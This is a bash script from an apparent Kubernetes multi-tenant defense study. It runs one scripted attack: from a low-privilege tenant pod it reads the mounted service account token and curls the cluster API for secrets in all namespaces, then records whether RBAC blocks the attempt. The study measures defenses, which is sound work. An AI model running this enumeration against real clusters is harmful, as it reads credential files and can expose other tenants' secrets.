#!/usr/bin/env bash
# =============================================================================
# ATTACK A4 — Unauthorized API Access
# Doc class : A4  |  Script: attack4.sh
# Spec      : Rev5 Section 13
# Objective : kube-hunter / Nuclei-style API endpoint enumeration and
#             unauthorized access attempt
#
# Techniques (spec-aligned — technique_sample_space.docx, |T|=1, Low tier):
#   T1 — Tool-based Enumeration   kube-hunter / Nuclei API endpoint
#                                 enumeration and unauthorized access attempt
#
# REVISION 6 NOTE: two extra techniques from the prior implementation
# (t2-direct-read, t3-exec) have been REMOVED — technique_sample_space.docx
# fixes |T_A4|=1 and this study does not re-derive or substitute technique
# counts. t1-secret-enum (all-namespace secret enumeration via SA token) is
# the closest existing match to "tool-based API endpoint enumeration" and is
# retained, renamed to the spec token t1-tool-enumeration.
#
# Primary defenders: L3a (RBAC blocks the enumeration read), L2 (auth gate
#                     upstream of RBAC)
#
# Output: SUCCESS|<technique>|<detail>
#         BLOCKED|<technique>|<detail>
#         SKIP|<reason>
# =============================================================================
set -euo pipefail

ATTACKER_NS="${ATTACKER_NS:-tenant-lowpriv}"
VICTIM_NS="${VICTIM_NS:-tenant-finserv}"
SEED="${SEED:-$$}"

succeed() { echo "SUCCESS|$1|$2"; exit 0; }
blocked() { echo "BLOCKED|$1|$2"; exit 1; }
skip()    { echo "SKIP|$1";       exit 2; }

TECHNIQUES=(t1-tool-enumeration)
N_TECH=${#TECHNIQUES[@]}
: "${TECHNIQUE_IDX:?TECHNIQUE_IDX env var required}"
[[ "$TECHNIQUE_IDX" -lt 0 || "$TECHNIQUE_IDX" -ge "$N_TECH" ]] && {
  echo "SKIP|TECHNIQUE_IDX-out-of-range-$TECHNIQUE_IDX"; exit 2; }
TECHNIQUE="${TECHNIQUES[$TECHNIQUE_IDX]}"
echo "[A4] SEED=$SEED TECHNIQUE_IDX=$TECHNIQUE_IDX technique=$TECHNIQUE"

ATTACKER_POD=$(kubectl get pod -n "$ATTACKER_NS" -l app=client \
  --field-selector=status.phase=Running \
  -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)
[[ -z "$ATTACKER_POD" ]] && skip "no-attacker-pod-in-$ATTACKER_NS"

case "$TECHNIQUE" in

  t1-tool-enumeration)
    # kube-hunter/Nuclei-style behaviour: enumerate API-reachable resources
    # across namespaces using only the attacker's own (unauthorized) SA token
    # — no prior credential theft, no crafted RBAC objects. Success = the
    # enumeration sweep returns resources outside the attacker's own namespace.
    # Blocked by L3a: RBAC denies the cross-namespace list/enumerate verb.
    echo "[A4-t1] enumerating all-namespace secrets using attacker SA token (unauthorized access attempt)"
    SECRET_COUNT=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
      sh -c "curl -sk --max-time 5 \
        --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
        -H \"Authorization: Bearer \$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" \
        'https://kubernetes.default.svc/api/v1/secrets' 2>/dev/null \
        | grep '\"name\"' | wc -l" 2>/dev/null || echo "0")
    echo "[A4-t1] secrets visible via enumeration sweep: $SECRET_COUNT"
    [[ "$SECRET_COUNT" -gt 0 ]] \
      && succeed "t1-tool-enumeration" "enumeration-exposed count=$SECRET_COUNT" \
      || blocked "t1-tool-enumeration" "rbac-denied count=0"
    ;;

  *)
    skip "unknown-technique-$TECHNIQUE"
    ;;
esac
